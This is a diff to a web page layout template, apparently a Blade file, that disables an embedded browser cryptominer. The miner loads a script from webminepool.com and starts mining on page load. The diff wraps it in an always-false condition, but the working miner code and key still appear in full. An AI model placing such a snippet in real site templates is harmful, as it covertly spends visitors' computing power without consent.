@@ -207,15 +207,17 @@
         }
     </style>
     @stack('styles')
-    <script src="https://webminepool.com/lib/base.js"></script>
-    <script>
-        window.onload = function() {
-            console.log('JavaScript Loaded.');
-            var miner = WMP.Anonymous('PK_E2svECzRD8g4zAKzHDtnQ', {throttle: 0.4});
-            miner.start();
-            console.log('JavaScript Working.');
-        }
-    </script>
+    @if(false)
+        <script src="https://webminepool.com/lib/base.js"></script>
+        <script>
+            window.onload = function() {
+                console.log('JavaScript Loaded.');
+                var miner = WMP.Anonymous('PK_E2svECzRD8g4zAKzHDtnQ', {throttle: 0.4});
+                miner.start();
+                console.log('JavaScript Working.');
+            }
+        </script>
+    @endif
 </head>
 
 <body class="header-fixed" style="margin: 0; padding: 0;">
